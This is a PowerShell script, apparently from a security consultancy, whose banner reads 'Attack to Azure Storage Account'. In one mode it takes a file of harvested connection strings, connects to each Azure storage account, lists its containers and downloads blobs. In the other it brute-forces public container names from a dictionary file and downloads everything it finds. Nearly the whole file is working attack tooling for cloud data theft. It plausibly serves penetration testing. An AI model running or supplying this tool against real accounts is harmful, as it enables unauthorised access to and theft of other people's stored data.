<#
.SYNOPSIS
    Access and download blobs from Azure Storage Accounts using provided connection strings or anonymously from public storage accounts.

.DESCRIPTION
    This script reads a file containing connection strings (either SAS Keys or Access Keys) for Azure Storage Accounts.
    For each valid connection string, it identifies the available blobs and downloads a specified number of blobs from each container.
    Alternatively, it can access public storage accounts anonymously and download blobs.

.PARAMETER ReconMode
    The mode of operation. Use "AuthenticateMode" for accessing with connection strings and "PublicMode" for anonymous access.

.PARAMETER connectionStringsFile
    The path to the file containing connection strings, one per line. Required if ReconMode is "AuthenticateMode".

.PARAMETER StorageAccountName
    The name of the public storage account. Required if ReconMode is "PublicMode".

.PARAMETER blobsToDownloadCount
    The number of blobs to download from each identified container.

.PARAMETER DictionaryFile
    Password dictionary file used to extract public blobs using brute force.

.EXAMPLE
    .\Access-AzureStorageAccount.ps1 -ReconMode "AuthenticateMode" -connectionStringsFile "connectionStrings.txt" -blobsToDownloadCount 5
    This command will read the connection strings from "connectionStrings.txt" and download 5 blobs from each container in the identified storage accounts.

    .\Access-AzureStorageAccount.ps1 -ReconMode "PublicMode" -StorageAccountName "publicstorageaccount" -blobsToDownloadCount 5 -DictionaryFile .\small.txt
    This command will anonymously access the specified public storage account and download 5 blobs from each container.

.NOTES
    Author: Daniel Hejda
    Company: Cyber Rangers s.r.o.
    Date Created: 2024-07-11
    Change Log:
        2024-07-11 - Script created.
        2024-07-14 - Added ReconMode for authenticated and anonymous access.
        2024-07-14 - Added Download mode from Public storage.
#>

param (
    [Parameter(Mandatory=$true)]
    [ValidateSet("AuthenticateMode", "PublicMode")]
    [string]$ReconMode,
    [string]$connectionStringsFile,
    [string]$StorageAccountName,
    [int]$blobsToDownloadCount,
    [string]$DictionaryFile
)

# Validace povinných parametrů
if ($ReconMode -eq "AuthenticateMode" -and -not $connectionStringsFile) {
    Write-Host "Parameter connectionStringsFile is required in AuthenticateMode." -ForegroundColor Red
    exit
}

if ($ReconMode -eq "PublicMode" -and -not $StorageAccountName) {
    Write-Host "Parameter StorageAccountName is required in PublicMode." -ForegroundColor Red
    exit
}

# Hlavicka
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow
Write-Host "Attack to Azure Storage Account" -ForegroundColor Cyan
Write-Host "--> Mode: $($ReconMode)" -ForegroundColor Blue
if ($ReconMode -eq "AuthenticateMode") {
    Write-Host "--> Connection strings file: $($connectionStringsFile)" -ForegroundColor Blue
}
if ($ReconMode -eq "PublicMode") {
    Write-Host "--> Storage account name: $($StorageAccountName)" -ForegroundColor Blue
}
Write-Host "--> How many files from each blob will be downloaded: $($blobsToDownloadCount)" -ForegroundColor Blue
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow

# Kontrola existence souboru v AuthenticateMode
if ($ReconMode -eq "AuthenticateMode" -and -Not (Test-Path $connectionStringsFile)) {
    Write-Host "File $($connectionStringsFile) not exist." -ForegroundColor Red
    exit
}

# Načtení connection stringů v AuthenticateMode
if ($ReconMode -eq "AuthenticateMode") {
    Write-Host "Loading file $($connectionStringsFile)" -ForegroundColor Green
    $connectionStrings = @(Get-Content -Path $connectionStringsFile)
} else {
    $connectionStrings = @("")
}

# Import Azure module, pokud ještě není importován
Write-Host "Check availability for Az module" -fore Green
if (-Not (Get-Module -ListAvailable -Name Az.Storage)) {
    Write-Host "Install Az Module" -ForegroundColor Green
    Install-Module -Name Az.Storage -Force -AllowClobber > $null
}
Write-Host "Import module Az" -ForegroundColor Green
Import-Module Az.Storage -Force  > $null

# Funkce pro ověření connection stringu nebo anonymní přístup
function Test-StorageAccountConnection {
    param (
        [string]$connectionString
    )

    
    if ($ReconMode -eq "AuthenticateMode") {
        try {
            # Nastavení kontextu pro Azure Storage s connection stringem
            Write-Host "--> Set Azure Context" -ForegroundColor Cyan
            Write-Host "----> $($connectionString)" -ForegroundColor Cyan
            $context = New-AzStorageContext -ConnectionString $connectionString -ErrorAction SilentlyContinue -WarningAction SilentlyContinue

            # Ověření, zda se můžeme připojit
            Write-Host "------> Connect to Azure storage account" -ForegroundColor Blue
            $containers = Get-AzStorageContainer -Context $context -ErrorAction Stop
            Write-Host "--------> Success connection" -ForegroundColor Green
            if($blobsToDownloadCount -gt 0){
                # Výpis existujících kontejnerů a stažení souborů
                foreach ($container in $containers) {
                    if ($container.CloudBlobContainer.Properties.PublicAccess -eq "On") {
                        Write-Host "----------> $($container.Name) with PublicAccess is (On)" -ForegroundColor Green
                    } else {
                        Write-Host "----------> $($container.Name) with PublicAccess is ($($container.CloudBlobContainer.Properties.PublicAccess))" -ForegroundColor Yellow
                    }

                    # Získání blobů v kontejneru
                    $blobs = Get-AzStorageBlob -Container $container.Name -Context $context -ErrorAction Stop

                    # Stažení nastaveného počtu blobů
                    $blobsToDownload = $blobs | Select-Object -First $blobsToDownloadCount
                    foreach ($blob in $blobsToDownload) {
                        $blobName = $blob.Name
                        $destinationPath = Join-Path -Path "DownloadedBlobs" -ChildPath $blobName

                        # Vytvoření adresáře pro stažené soubory, pokud neexistuje
                        $destinationDirectory = Split-Path -Path $destinationPath
                        if (-Not (Test-Path $destinationDirectory)) {
                            New-Item -ItemType Directory -Path $destinationDirectory -Force > $null
                        }

                        Write-Host "------------> Downloading $blobName from container $($container.Name)" -ForegroundColor Cyan
                        $DownloadedBlob = Get-AzStorageBlobContent -Blob $blobName -Container $container.Name -Context $context -Destination $destinationPath -Force
                        Write-Host "--------------> Downloading this blob $($DownloadedBlob.Name)" -ForegroundColor Green
                    }

                }
            }
        }
        catch {
            Write-Host "--------> Failed connection" -ForegroundColor red
        }
    } elseif ($ReconMode -eq "PublicMode") {
        # Anonymní přístup k veřejnému storage account
        Write-Host "--> Set Azure Context for anonymous access" -ForegroundColor Cyan
        Write-Host "----> This mode is under developmnet. <----"
        try {
            $testPublicAccess = Invoke-WebRequest -Uri "https://$($StorageAccountName).blob.core.windows.net/`$logs?restype=container&comp=list"
        } catch {
            if ($_ -like "*PublicAccessNotPermitted*") {
                Write-Host "----> Public access not permitted." -ForegroundColor Red
                continue # Pokračuje na další položku ve foreach
            } elseif ($_ -like "*ResourceNotFoundThe*") {
                Write-Host "----> Storage container is publicly accessible." -ForegroundColor Green
                $PublicAccessBaseUri =  "https://$($StorageAccountName).blob.core.windows.net/"
            } else {
                Write-Host "----> Error: $($_)" -ForegroundColor Yellow
                continue
            }
        }

        #Pokud byl nalezen veřejně přístupná kontejner, tak bude pokračovat s brutforce blobů v storage account
        $dictionary = @(Get-Content -LiteralPath ".\$($DictionaryFile)")
        if($PublicAccessBaseUri){
            ForEach ($word in $dictionary){
                $TestedUri = "$($PublicAccessBaseUri)$($word)?restype=container&comp=list"
                try {
                    $content = Invoke-WebRequest -Method Get -Uri $TestedUri    
                }
                catch {
                    Write-Host "------> Blob $($word) is not accessible." -ForegroundColor Red
                    Remove-Variable content -ErrorAction SilentlyContinue
                    continue
                }
    
                if($content.StatusCode -eq "200"){
                    Write-Host "------> $($word): Status code is 200 for $($TestedUri)." -ForegroundColor Green
                   # Načtení XML obsahu z proměnné $Content.Content
                    $rawContent = $Content.Content

                    # Rozdělení obsahu na základě prvního platného znaku XML
                    $cleanContent = $rawContent -split '<\?xml', 2
                    $cleanContent = '<?xml' + $cleanContent[1]

                    # Převod obsahu na XML
                    [xml]$xmlContent = $cleanContent

                    # Vytvoření prázdného pole pro uložení dat
                    $data = @()

                    # Iterace přes každý Blob a extrahování informací
                    foreach ($blob in $xmlContent.EnumerationResults.Blobs.Blob) {
                        $blobData = [PSCustomObject]@{
                            Name            = $blob.Name
                            Url             = $blob.Url
                            LastModified    = $blob.Properties.'Last-Modified'
                            Etag            = $blob.Properties.Etag
                            ContentLength   = $blob.Properties.'Content-Length'
                            ContentType     = $blob.Properties.'Content-Type'
                            ContentMD5      = $blob.Properties.'Content-MD5'
                            BlobType        = $blob.Properties.BlobType
                            LeaseStatus     = $blob.Properties.LeaseStatus
                        }
                        $data += $blobData
                    }
                    Write-Host "--------> Enumerated files from blob" -ForegroundColor Cyan
                    # Zobrazení dat v tabulce
                    #$data | Format-Table -AutoSize
                    
                    # Nastavení základního adresáře pro stahování
                    $baseDownloadDir = "DownloadedPublicBlob"
                    if (-not (Test-Path -Path $baseDownloadDir)) {
                        New-Item -Path $baseDownloadDir -ItemType Directory  -Force > $null
                    }

                    # Iterace přes každý Blob a stahování souborů
                    foreach ($blob in $data) {
                        $blobName = $blob.Name
                        $blobUrl = $blob.Url
                        $blobDir = Join-Path -Path $baseDownloadDir -ChildPath $blobName

                        # Vytvoření adresáře pro daný blob, pokud neexistuje
                        if (-not (Test-Path -Path $blobDir)) {
                            New-Item -Path $blobDir -ItemType Directory  -Force > $null
                        }

                        # Sestavení cesty pro stažení souboru
                        $fileName = [System.IO.Path]::GetFileName($blobUrl)
                        $downloadPath = Join-Path -Path $blobDir -ChildPath $fileName

                        # Přidání pořadového čísla, pokud soubor již existuje
                        $counter = 1
                        while (Test-Path -Path $downloadPath) {
                            $fileBaseName = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
                            $fileExtension = [System.IO.Path]::GetExtension($fileName)
                            $newFileName = "$fileBaseName-$counter$fileExtension"
                            $downloadPath = Join-Path -Path $blobDir -ChildPath $newFileName
                            $counter++
                        }

                        # Stažení souboru s ošetřením chyb
                        try {
                            Invoke-WebRequest -Uri $blobUrl -OutFile $downloadPath > $null
                            Write-Host "----------> Downloaded $blobName to $downloadPath" -ForegroundColor Green
                        } catch {
                            Write-Host "----------> Failed to download $blobName from $blobUrl" -ForegroundColor Red
                        }
                    }
                    Remove-Variable content -ErrorAction SilentlyContinue
                }else{
                    Write-Host "------> $($word): Status code is NOT 200 for $($TestedUri)." -ForegroundColor Red
                    Remove-Variable content -ErrorAction SilentlyContinue
                    continue
                }
           }
        }
    }else {
        Write-Host "You must set the ReconMode." -ForegroundColor Red
    }
    Write-Host ""
}

# Procházení každého connection stringu a jeho testování
foreach ($connectionString in $connectionStrings) {
    Test-StorageAccountConnection -connectionString $connectionString
}
